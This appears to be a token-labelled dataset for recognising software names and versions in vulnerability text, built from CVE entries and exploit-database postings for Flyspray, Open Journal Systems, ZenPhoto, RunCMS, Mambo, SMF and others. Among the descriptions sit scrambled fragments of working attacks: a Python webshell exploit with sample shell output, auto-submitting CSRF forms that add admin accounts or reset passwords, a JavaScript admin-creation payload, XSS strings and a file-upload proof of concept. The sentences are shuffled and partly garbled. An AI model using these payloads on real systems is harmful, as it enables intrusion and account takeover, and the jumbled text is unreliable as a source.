Subject O
: O
CVE O
for O
Drupal SN
Contrib SN
2012 SV
001 SV
through SV
057 SV
( O
67 O
new O
CVE O
assignments O
) O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
Flyspray SN
0.9.9.6 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
admins O
for O
requests O
that O
add O
admin O
accounts O
via O
an O
admin.newuser O
action O
to O
index.php O
. O

Flyspray SN
0.9.9.6 SV
- O
Cross-Site O
Request O
Forgery O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
index/manager/fileUpload O
in O
Public SN
Knowledge SN
Project SN
Open SN
Journal SN
Systems SN
2.3.6 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
upload O
PHP O
files O
. O

( O
- O
) O
Code O
injection O
and O
execution O
failed O
! O

Code O
injection O
worked O
! O

I O
m O
sick O
of O
vendors O
ignoring O
me O
on O
this O
kind O
of O
bug O
. O

Launching O
webshell.. O
! O

sys.exit O
( O
1 O
) O
if O
name O
main O
: O
main O
( O
) O

hn O
= O
opensys_shell O
@ O
% O
s O
options.target O
) O
raw_cmd O
= O
while O
raw_cmd O
! O
= O
q O
: O
raw_cmd O
= O
raw_input O
( O
hn O
) O
base64_cmd O
= O
b64encode O
( O
system O
( O
% O
s O
raw_cmd O
) O
try O
: O
full_request O
= O
options.target O
options.target_path O
+ O
/files O
+ O
app_type O
app_entry_id O
+ O
/zeitgeist.php O
cmd_response O
= O
submit_request O
( O
full_request O
, O
base64_cmd O
, O
) O
except O
: O
print O
Code O
injection O
and O
execution O
failed O
! O
) O

Just O
use O
the O
first O
conference/journal/archive O
, O
and O
it O
will O
be O
id O
1 O
. O

( O
+ O
) O
Listening O
on O
local O
port O
9090 O
. O

Description O
: O
PKP O
has O
developed O
free O
, O
open O
source O
software O
for O
the O
management O
, O
publishing O
, O
and O
indexing O
of O
journals O
and O
conferences O
. O

Open O
Harvester O
systems O
allows O
the O
creation O
of O
centralized O
search O
services O
on O
metadata O
from O
Open O
Archives O
Initiative-compliant O
databases O
. O

Exploit O
requirement O
Find O
the O
target O
conference/journal/archive O
: O
just O
visit O
It O
will O
be O
a O
string O
value O
in O
a O
URI O
embeded O
in O
the O
page O
. O

% O
( O
target O
, O
options.target O
) O
) O
sleep O
( O
2 O
) O
let O
the O
target O
get O
exploited O
, O
sheesh O
. O

opensys_shell O
@ O
192.168.220.134 O
id O
uid=33 O
( O
www-data O
) O
gid=33 O
( O
www-data O
) O
groups=33 O
( O
www-data O
) O
opensys_shell O
@ O
192.168.220.134 O
uname O
-a O
Linux O
steve-web-server O
2.6.35-31-generic O
62-Ubuntu O
SMP O
Tue O
Nov O
8 O
14:00:30 O
UTC O
2011 O
i686 O
GNU/Linux O
opensys_shell O
@ O
192.168.220.134 O
q O
Back O
to O
listening O
C O
( O
- O
) O
Exiting O
Exploit O
. O

have O
a O
merry O
christmas O
& O
happy O
new O
year O
! O

sys.stdout.flush O
( O
) O
else O
: O
print O
( O
proxy O
failed O
, O
exiting.. O
) O
sys.exit O
( O
1 O
) O
def O
submit_request O
( O
exploit O
, O
header=None O
, O
data=None O
) O
: O
try O
: O
if O
header O
! O
= O
None O
: O
headers O
= O
{ O
} O
headers O
[ O
Hax O
] O
= O
header O
if O
data O
! O
= O
None O
: O
data O
= O
urllib.urlencode O
( O
data O
) O
req O
= O
urllib2.Request O
( O
data O
, O
headers O
) O
if O
options.proxy O
: O
req.set_proxy O
( O
options.proxy O
, O
http O
) O
check O
= O
urllib2.urlopen O
( O
req O
) O
.read O
( O
) O
except O
urllib.error.HTTPError O
, O
error O
: O
check O
= O
error.read O
( O
) O
except O
urllib.error.URLError O
: O
print O
Target O
connection O
failed O
, O
check O
your O
address O
) O
sys.exit O
( O
1 O
) O
return O
check O
def O
check_request O
( O
req O
) O
: O
req O
= O
urllib2.Request O
( O
options.proxy O
: O
req.set_proxy O
( O
options.proxy O
, O
http O
) O
return O
urllib2.urlopen O
( O
req O
) O
.code O
def O
check_shell O
( O
) O
: O
full_request O
= O
options.target O
options.target_path O
+ O
/files O
+ O
app_type O
app_entry_id O
+ O
/zeitgeist.php O
try O
: O
check_request O
( O
full_request O
) O
print O
( O
( O
! O
) O

Launching O
webshell.. O
! O
) O

Code O
injection O
worked O
! O
) O

return O
True O
except O
: O
print O
Code O
injection O
and O
execution O
failed O
! O
) O

Open SN
Conference/Journal/Harvester SN
Systems SN
2.3.x SV
- O
Multiple O
Remote O
Code O
Execution O
Vulnerabilities O

Multiple O
cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerabilities O
in O
Support SN
Incident SN
Tracker SN
( O
aka SN
SiT SN
) O
before SV
3.65 SV
allow O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
change O
administrator O
email O
, O
add O
a O
new O
administrator O
, O
or O
insert O
arbitrary O
script O
via O
( O
1 O
) O
user_profile_edit.php O
or O
( O
2 O
) O
user_add.php O
. O

This O
can O
be O
exploited O
to O
manipulate O
SQL O
queries O
by O
injecting O
arbitrary O
SQL O
code O
. O

Vendor O
Notification O
: O
24 O
August O
2011 O
Vulnerability O
Type O
: O
SQL O
Injection O
, O
XSS O
, O
CSRF O
Status O
: O

Fixed O
by O

Vulnerability O
ID O
: O
HTB23043 O
Reference O
: O
_incident_tracker.html O
Product O
: O
SiT O
Support O
Incident O
Tracker O

Vulnerable O
Version O
: O
3.64 SV
and SV
probably SV
prior SV

Tested O
Version O
: O
3.64 SV

Vendor O
: O
The O
Support O
Incident O
Tracker O
Project O
( O
) O

Multiple O
vulnerabilities O
in O
SiT O
Support O
Incident O
Tracker O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
/ctrl O
in O
the O
web O
interface O
in O
HomeSeer SN
HS2 SV
2.5.0.20 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
admins O
for O
requests O
that O
execute O
arbitrary O
programs O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
HP SN
Insight SN
Control SN
Performance SN
Management SN
before SV
6.3 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
unspecified O
victims O
via O
unknown O
vectors O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
zp-core/admin-options.php O
in O
Zenphoto SN
1.2.5 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
change O
the O
administrative O
password O
via O
the O
0-adminpass O
and O
0-adminpass_2 O
parameters O
in O
a O
saveoptions O
action O
. O

We O
hope O
you O
agree O
with O
our O
philosopy O
: O
simpler O
is O
better O
. O

Exploit O
Explaination O
This O
exploit O
actually O
advantage O
of O
two O
vulnerabilities O
. O

Unfortunatly O
, O
it O
only O
executes O
if O
the O
admin O
is O
NOT O
already O
logged O
in O
. O

, O
Site O
: O
$ O
site/zp-core/admin.php O
Username O
: O
$ O
user O
Password O
: O
$ O
pass O
) O
; O
} O
function O
redirect O
( O
) O
{ O
header O
( O
Location O
: O
$ O
site/zp-core/admin.php O
) O
; O
exit O
; O
} O

Where O
the O
old O
guys O
put O
in O
a O
bunch O
of O
modules O
and O
junk O
, O
we O
put O
a O
lot O
of O
thought O
. O

milw0rm.com O
[ O
2009-07-16 O
] O

This O
exploit O
only O
works O
if O
the O
admin O
already O
logged O
in O
. O

Affects O
: O
ZenPhoto SN
Gallery SN
1.2.5 SV
Zenphoto O
is O
an O
answer O
to O
lots O
of O
calls O
for O
an O
online O
gallery O
solution O
that O
just O
makes O
sense O
. O

/zp-core/admin-options.php O
action=saveoptions O
; O
echo O
< O
html O
> O
< O
head O
> O
< O
script O
> O
function O
badboy O
( O
) O
{ O
document.forms O
.submit O
( O
) O
; O
{ O
< O
/script O
> O
< O
/head O
> O
; O
echo O
< O
body O
onload= O
badboy O
form O
action= O
$ O
action O
method= O
POST O
> O
; O
foreach O
( O
$ O
inputs O
as O
$ O
key O
= O
$ O
value O
) O
{ O
echo O
< O
input O
name= O
$ O
key O
value= O
$ O
value O
type= O
hidden O
echo O
< O
input O
type= O
submit O
value= O
Click O
Me O
! O

It O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xe2 O
x84 O
xa2s O
got O
all O
the O
functionality O
and O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xc5 O
x93features O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xc2 O
x9d O
you O
need O
, O
and O
nothing O
you O
don O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xe2 O
x84 O
xa2t O
. O

ZenPhoto SN
Gallery SN
1.2.5 SV
- O
Admin O
Password O
Reset O
( O
Cross-Site O
Request O
Forgery O
) O

Multiple O
cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerabilities O
in O
PyForum SN
1.0.3 SV
and SV
possibly SV
earlier SV
versions O
, O
and O
possibly O
zForum O
, O
allow O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
victims O
for O
requests O
that O
change O
passwords O
, O
and O
other O
unspecified O
requests O
, O
via O
unknown O
vectors O
. O

These O
bugs O
are O
rated O
at O
critical O
because O
they O
can O
be O
easily O
exploited O
and O
cause O
lost O
of O
integrity O
. O

Workaround O
There O
is O
no O
workaround O
. O

Blue O
Moon O
Consulting O
Co. O
, O
Ltd O
disclaims O
all O
warranties O
, O
either O
express O
or O
implied O
, O
including O
the O
warranties O
of O
merchantability O
and O
fitness O
for O
a O
particular O
purpose O
. O

Your O
use O
of O
the O
information O
on O
the O
advisory O
or O
materials O
linked O
from O
the O
advisory O
is O
at O
your O
own O
risk O
. O

XSS O
vulnerability O
lies O
in O
the O
BBcode O
parsing O
in O
module O
`` O
models.parser O
`` O
. O

Fix O
There O
is O
no O
fix O
at O
the O
moment O
. O

BLUE O
MOON O
SECURITY O
ADVISORY O
2009-08 O
: O
Title O
: O
Multiple O
Vulnerabilities O
in O
PyForum O
: O
Severity O
: O
Critical O
: O
Reporter O
: O
Hoang O
Quoc O
Thinh O
and O
Blue O
Moon O
Consulting O
: O
Products O
: O
PyForum SN
v1.0.3 SV
: O
Fixed O
in O
: O
Description O
PyForum O
is O
a O
100 O
% O
python-based O
message O
board O
system O
based O
in O
the O
excellent O
web2py O
framework O
. O

CSRF O
vulnerability O
lies O
in O
the O
design O
of O
this O
web O
application O
. O

We O
have O
discovered O
cross O
site O
scripting O
and O
cross O
site O
request O
forgery O
vulnerabilities O
in O
PyForum O
. O

Disclaimer O
The O
information O
provided O
in O
this O
advisory O
is O
provided O
as O
is O
without O
warranty O
of O
any O
kind O
. O

[ O
BMSA-2009-08 O
] O
Multiple O
Vulnerabilities O
in O
PyForum O

Multiple O
cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerabilities O
in O
FreePBX SN
2.5.1 SV
, O
and SV
other SV
2.4.x SV
, O
2.5.x SV
, O
and SV
pre-release SV
2.6.x SV
versions O
, O
allow O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
admins O
for O
requests O
that O
create O
a O
new O
admin O
account O
or O
have O
unspecified O
other O
impact O
. O

Unspecified O
vulnerability O
in O
Drupal SN
5.x SV
before SV
5.17 SV
and SV
6.x SV
before SV
6.11 SV
, O
as O
used O
in O
vbDrupal SN
before SV
5.17.0 SV
, O
allows O
user-assisted O
remote O
attackers O
to O
obtain O
sensitive O
information O
by O
tricking O
victims O
into O
visiting O
the O
front O
page O
of O
the O
site O
with O
a O
crafted O
URL O
and O
causing O
form O
data O
to O
be O
sent O
to O
an O
attacker-controlled O
site O
, O
possibly O
related O
to O
multiple O
( O
slash O
) O
characters O
that O
are O
not O
properly O
handled O
by O
includes/bootstrap.inc O
, O
as O
demonstrated O
using O
the O
search O
box O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
Bugzilla SN
before SV
3.2 SV
before SV
3.2.1 SV
, O
3.3 SV
before SV
3.3.2 SV
, O
and SV
other SV
versions SV
before SV
3.2 SV
allows O
remote O
attackers O
to O
perform O
bug O
updating O
activities O
as O
other O
users O
via O
a O
link O
or O
IMG O
tag O
to O
process_bug.cgi O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
page O
34 O
in O
MODx SN
CMS SN
0.9.6.1 SV
and SV
0.9.6.1p1 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
other O
users O
for O
requests O
that O
modify O
passwords O
via O
manager/index.php O
. O

Digital O
Security O
Research O
Group O
[ O
DSecRG O
] O
Advisory O
DSECRG-08-013 O
Application O
: O
MODx O
CMS O
Versions O

Linked O
SiXSS O
3 O
. O

Multiple O
linked O
SiXSS O
vulnerabilities O
found O
. O

Linked O
XSS O
2 O
. O

Example O
: O
name O
= O
style= O
background O
: O
url O
( O
javascript O
: O
alert O
( O
DSecRG O
XSS O
) O
) O
4 O
. O

Attacker O
can O
comprose O
message O
with O
script O
code O
in O
subject O
and O
message O
body O
. O

GET O
parameter O
id O
Example O
: O
src= O
javascript O
: O
alert O
( O
DSecRG O
XSS O
) O
3 O
. O

Digital O
Security O
Research O
Group O
focuses O
on O
web O
application O
and O
database O
security O
problems O
with O
vulnerability O
reports O
, O
advisories O
and O
whitepapers O
posted O
regularly O
on O
our O
website O
. O

Contact O
: O
research O
[ O
at O
] O
dsec O
[ O
dot O
] O
ru O
( O
in O
Russian O
) O

Change O
User O
Password O
XSRF O
Vulnerability O
Details O
1 O
. O

2.1 O
Vulnerability O
found O
in O
script O
manager/index.php O
. O

GET O
parameter O
highlight O
Example O
: O
SRC= O
javascript O
: O
alert O
( O
DSecRG O
XSS O
) O
2 O
. O

Exploits O
: O
YES O
Reported O
: O
11.01.2008 SV

Attacker O
can O
inject O
XSS O
in O
URL O
string O
. O

Attacker O
can O
inject O
XSS O
code O
in O
SQL O
Error O
. O

1.1 O
Linked O
XSS O
vulnerability O
found O
in O
manager/index.php O
. O

POST O
parameters O
email O
, O
name O
and O
parent O
. O

Multiple O
linked O
XSS O
vulnerabilities O
found O
. O

Affected O
: O
0.9.6.1 SV
, O
0.9.6.1p1 SV

XSS O
in O
POST O
4 O
. O

POST O
parameters O
docgrp O
and O
moreResultsPage O
. O

[ O
DSECRG-08-013 O
] O
Modx SN
0.9.6.1 SV
, O
0.9.6.1p1 SV
Multiple O
Security O
Vulnerabilities O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
RunCMS SN
1.6.1 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
( O
1 O
) O
add O
new O
administrators O
or O
( O
2 O
) O
modify O
user O
profiles O
via O
a O
crafted O
request O
to O
system/admin.php O
. O

RunCMS SN
1.6.1 SV
Multiple O
XSS O
and O
XSRF O
Vulnerabilties O
by O
NBBN O
[ O
b O
] O
1 O
) O
Create O
Webmaster O
( O
admin O
) O
XSRF O
Vulnerability O
[ O
/b O
] O
< O
html O
> O
< O
head O
> O
< O
/head O
> O
< O
body O
onLoad= O
javascript O
: O
document.attack.submit O
( O
) O
< O
form O
action= O
method= O
post O
enctype= O
multipart/form-data O
name= O
r O
< O
input O
type= O
hidden O
name= O
uname O
value= O
Attacker O
< O
input O
type= O
hidden O
name= O
name O
value= O
Attacker O
< O
input O
type= O
hidden O
name= O
email O
value= O
attack O
( O
at O
) O
attack O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
< O
input O
type= O
hidden O
name= O
url O
value= O
< O
input O
type= O
hidden O
name= O
user_avatar O
value= O
blank.gif O
< O
input O
type= O
hidden O
name= O
theme O
value= O
helloween O
< O
input O
type= O
hidden O
name= O
timezone_offset O
value= O
0 O
< O
input O
type= O
hidden O
name= O
language O
value= O
deutsch O
< O
input O
type= O
hidden O
name= O
user_icq O
value= O
< O
input O
type= O
hidden O
name= O
user_aim O
value= O
< O
input O
type= O
hidden O
name= O
user_msnm O
value= O
< O
input O
type= O
hidden O
name= O
user_from O
value= O
< O
input O
type= O
hidden O
name= O
user_occ O
value= O
< O
input O
type= O
hidden O
name= O
user_intrest O
value= O
< O
input O
type= O
hidden O
name= O
user_birth O
% O
5b2 O
% O
5D O
value= O
< O
input O
type= O
hidden O
name= O
user_birth O
% O
5B1 O
% O
5D O
value= O
< O
input O
type= O
hidden O
name= O
user_birth O
% O
5BO O
% O

RunCMS SN
1.6.1 SV
Multiple O
XSS O
and O
XSRF O
Vulnerabilties O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
administrator/index2.php O
in O
MOStlyCE SN
before SV
2.4 SV
, O
as O
used O
in O
Mambo SN
4.6.3 SV
and SV
earlier SV
, O
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
administrators O
for O
requests O
that O
add O
new O
administrator O
accounts O
via O
the O
save O
task O
in O
a O
com_users O
action O
, O
as O
demonstrated O
using O
a O
separate O
XSS O
vulnerability O
in O
mambots/editors/mostlyce/jscripts/tiny_mce/filemanager/connectors/php/connector.php O
. O

You O
can O
create O
this O
structure O
manually O
or O
extract O
the O
UserFiles.zip O
file O
included O
with O
MOStlyCE O
at O
that O
location O
. O

POC O
: O
filemanager/connectors/php/connector.php O
Command=FileUpload O
& O
file=a O
& O
file O
[ O
NewFile O
] O
[ O
name O
] O
=abc.gif O
& O
file O
[ O
NewFile O
] O
[ O
tmp_name O
] O
=C O
: O
/path/to/MamboV4.6.2/co O
nfiguration.php O
& O
file O
[ O
NewFile O
] O
[ O
size O
] O
=1 O
& O
CurrentFolder= O
- O
Credit O
: O
AmnPardaz O
Security O
Research O
Team O
Contact O
: O
admin O
[ O
4t O
} O
bugreport O
{ O
d0t O
] O
ir O
WwW.BugReport.ir O
WwW.AmnPardaz.com O

Vulnerable O
Version O
: O
4.6.3 SV
( O
prior SV
versions SV
also O
may O
be O
affected O
) O
Exploitation O
: O
Remote O
with O
browser O
Fix O
Available O
: O
No O
! O

For O
this O
installation O
your O
document O
root O
is O
[ O
something O
] O
. O

Code O
Snippet O
: O
/mambots/editors/mostlyce/jscripts/tiny_mce/filemanager/connectors/php/C O
ommands/FileUpload.php O
45-60 O
function O
run O
( O
) O
{ O
If O
using O
CGI O
Upload O
script O
, O
get O
file O
info O
and O
insert O
into O
$ O
_FILE O
array O
if O
( O
( O
sizeof O
( O
$ O
_FILES O
) O
0 O
) O
& O
& O
isset O
( O
$ O
_GET O
[ O
file O
isset O
( O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
is_array O
( O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
if O
( O
isset O
( O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
name O
GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
ize O
GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
tmp_name O
FILES O
[ O
NewFile O
] O
[ O
name O
] O
=basename O
( O
str_replace O
GET O
[ O
file O
NewFile O
] O
[ O
name O
FILES O
[ O
NewFile O
] O
[ O
ize O
] O
= O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
ize O
FILES O
[ O
NewFile O
] O
[ O
tmp_name O
] O
= O
$ O
_GET O
[ O
file O
] O
[ O
NewFile O
] O
[ O
tmp_name O
else O
{ O
$ O
disp= O
202 O
, O
Incomplete O
file O
information O
from O
upload O
CGI O

/ O
$ O
filename. O
$ O
ext O
) O
,0777 O
) O
; O
$ O
disp= O
0 O
; O
} O
else O
{ O
$ O
disp= O
202 O
, O
Failed O
to O
upload O
file O
, O
internal O
error O
else O
{ O
if O
( O
rename O
( O
$ O
_FILES O
[ O
NewFile O
] O
[ O
tmp_name O
] O
, O
( O
$ O
this- O
> O
real_cwd O
. O

/ O
$ O
filename. O
$ O
ext O
) O
,0777 O
) O
; O
$ O
disp= O
0 O
; O
} O
else O
{ O
$ O
disp= O
202 O
, O
Failed O
to O
upload O
file O
, O
internal O
error O

- O
Vulnerability O
: O
+ O
Path O
Disclosure O
POC O
: O
filemanager/connectors/php/connector.php O
Command=RenameFile O
+ O
XSS O
POC O
: O
filemanager/connectors/php/connector.php O
Command= O
< O
script O
> O
alert O
( O
document O
. O

If O
an O
administrator O
follows O
up O
the O
above O
instruction O
, O
its O
possible O
for O
a O
remote O
attacker O
to O
remove O
any O
file O
from O
the O
remote O
server O
for O
example O
the O
main O
configuration O
file O
, O
which O
could O
result O
in O
remote O
denial O
of O
service O
! O

WwW.BugReport.ir O
AmnPardaz O
Security O
Research O
Team O
Title O
: O
Mambo O
Vulnerabilities O

Vendor O
: O
Bugs O
: O
Path O
Disclosure O
, O
XSS O
, O
XSRF O
, O
DOS O

The O
impact O
of O
the O
vulnerability O
increases O
when O
the O
administrator O
doesnt O
remove O
installation O
folder O
( O
its O
common O
to O
rename O
it O
to O
something O
predictable O
such O
as O
_installation O
) O
, O
in O
such O
a O
condition O
its O
possible O
for O
a O
remote O
attacker O
to O
delete O
configuration.php O
and O
install O
a O
new O
version O
of O
mambo O
on O
the O
victim O
server O
using O
remote O
database O
! O

163-178 O
Upload O
file O
if O
( O
is_uploaded_file O
( O
$ O
_FILES O
[ O
NewFile O
] O
[ O
tmp_name O
if O
( O
move_uploaded_file O
( O
$ O
_FILES O
[ O
NewFile O
] O
[ O
tmp_name O
] O
, O
( O
$ O
this- O
> O
real_cwd O
. O

/ O
$ O
filename. O
$ O
ext O
chmod O
( O
( O
$ O
this- O
> O
real_cwd O
. O

Not O
your O
Mambo O
root O
, O
your O
document O
root O
! O

cookie O
) O
< O
/script O
+ O
XSRF O
( O
the O
exploit O
creates O
an O
admin O
account O
) O
POC O
: O
mce/filemanager/connectors/php/connector.php O
Command= O
< O
script O
type=text/javascript O
src= O
content O
of O
Set O
desiered O
user O
, O
pass O
, O
email O
and O
victims O
url O
then O
upload O
the O
script O
somewhere O
on O
the O
web O
window.onload O
= O
function O
( O
) O
{ O
var O
url O
= O
var O
gid O
= O
25 O
; O
var O
user O
= O
amnpardaz O
; O
var O
pass O
= O
amnpardaz O
; O
var O
email O
= O
amnpardaz O
( O
at O
) O
none O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
; O
var O
param O
= O
{ O
name O
: O
user O
, O
username O
: O
user O
, O
email O
: O
email O
, O
password O
: O
pass O
, O
password2 O
: O
pass O
, O
gid O
: O
gid O
, O
block O
: O
0 O
, O
option O
: O
com_users O
, O
task O
: O
ave O
, O
sendEmail O
: O
0 O
} O
; O
var O
form O
= O
document.createElement O
( O
form O
) O
; O
form.action O
= O
url O
; O
form.method O
= O
post O
; O
form.target O
= O
hidden O
; O
form.style.display O
= O
none O
; O
for O
( O
var O
i O
in O
param O
) O
{ O
try O
{ O
ie O
var O
input O
= O
document.createElement O
( O
< O
input O
name= O
+i O
catch O
( O
e O
) O
{ O
other O
browsers O
var O
input O
= O
document.createElement O
( O
input O
) O
; O
input.name O
= O
i O
; O
} O
input.setAttribute O
( O
value O
, O
param O
[ O

/ O
$ O
f O
ilename. O
$ O
ext O
chmod O
( O
( O
$ O
this- O
> O
real_cwd O
. O

You O
can O
find O
the O
UserFiles.zip O
file O
at O
/mambots/editors/mostlyce O
. O

Description O
: O
Mambo O
is O
an O
, O
open O
source O
, O
modular O
, O
web O
content O
management O
system O
( O
CMS O
) O
, O
written O
in O
Php O
with O
a O
MySql O
database O
in O
backend O
. O

Mambo SN
4.6.3 SV
Path O
Disclosure O
, O
XSS O
, O
XSRF O
, O
DOS O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
Cybozu SN
Office SN
6 SV
, O
Cybozu SN
Dezie SN
before SV
6.0 SV
( O
1.0 SV
) O
, O
and O
Cybozu SN
Garoon SN
2.0.0 SV
through SV
2.1.3 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
unspecified O
victims O
via O
unknown O
vectors O
. O

Cross-site O
request O
forgery O
( O
CSRF O
) O
vulnerability O
in O
index.php O
in O
Simple SN
Machines SN
Forum SN
( O
SMF SN
) O
1.0 SV
before SV
1.0.15 SV
and SV
1.1 SV
before SV
1.1.7 SV
allows O
remote O
attackers O
to O
hijack O
the O
authentication O
of O
admins O
for O
requests O
that O
install O
packages O
via O
the O
package O
parameter O
in O
an O
install2 O
action O
. O

SMF O
suffers O
from O
multiples O
vulnerabilities O
. O

secs O
( O
flood O
control O
) O
) O
; O
sleep O
( O
$ O
this- O
> O
wait O
) O
; O
Obtain O
session O
vars O
$ O
this- O
> O
url- O
> O
action O
= O
post O
; O
$ O
this- O
> O
url- O
> O
board O
= O
$ O
this- O
> O
bid O
. O

HTTP/1.1 O
; O
$ O
packet O
.= O
Host O
: O
. O

; O
if O
( O
! O
empty O
( O
$ O
this- O
> O
header O
) O
) O
$ O
this- O
> O
packet O
.= O
$ O
this- O
> O
showheader O
( O
) O
; O
if O
( O
! O
empty O
( O
$ O
this- O
> O
cookie O
) O
) O
$ O
this- O
> O
packet O
.= O
Cookie O
: O
. O
$ O
this- O
> O
showcookie O
( O
) O
. O

x2d O
xff O
xbd O
x41 O
x3e O
x98 O
x21 O
x1f O
xdc O
x23 O
x9f O
x39 O
x5b O
x08 O
. O

substr O
( O
$ O
data O
, O
( O
$ O
offset+2 O
return O
$ O
data O
Copyright O
( O
C O
) O
darkfig O
This O
program O
is O
free O
software O
; O
you O
can O
redistribute O
it O
and/or O
modify O
it O
under O
the O
terms O
of O
the O
GNU O
General O
Public O
License O
as O
published O
by O
the O
Free O
Software O
Foundation O
; O
either O
version O
2 O
of O
the O
License O
, O
or O
( O
at O
your O
option O
) O
any O
later O
version O
. O

@ O
access O
private O
@ O
param O
string O
code O
ServerResponse O
function O
getcookie O
( O
) O
{ O
foreach O
( O
explode O
( O
, O
$ O
this- O
> O
getheader O
( O
) O
) O
as O
$ O
header O
) O
{ O
if O
( O
preg_match O
( O
/set-cookie/i O
, O
$ O
header O
) O
) O
{ O
$ O
fequal O
= O
strpos O
( O
$ O
header O
fvirgu O
= O
strpos O
( O
$ O
header O
12=strlen O
( O
et-cookie O
: O
) O
$ O
cname O
= O
substr O
( O
$ O
header,12 O
, O
$ O
fequal-12 O
) O
; O
$ O
cvalu O
= O
substr O
( O
$ O
header O
, O
$ O
fequal+1 O
, O
$ O
fvirgu- O
( O
strlen O
( O
$ O
cname O
) O
+12+1 O
) O
) O
; O
$ O
this- O
> O
cookie O
[ O
trim O
( O
$ O
cname O
) O
] O
= O
trim O
( O
$ O
cvalu O
This O
function O
is O
called O
by O
the O
get O
( O
) O
/post O
( O
) O
functions O
. O

x71 O
x83 O
x7a O
x88 O
x02 O
xad O
x6a O
x28 O
xa2 O
x48 O
x4c O
xb4 O
x0d O
x9a O
. O

So O
here O
come O
the O
wait-I O
ve-not-finished O
part O
. O

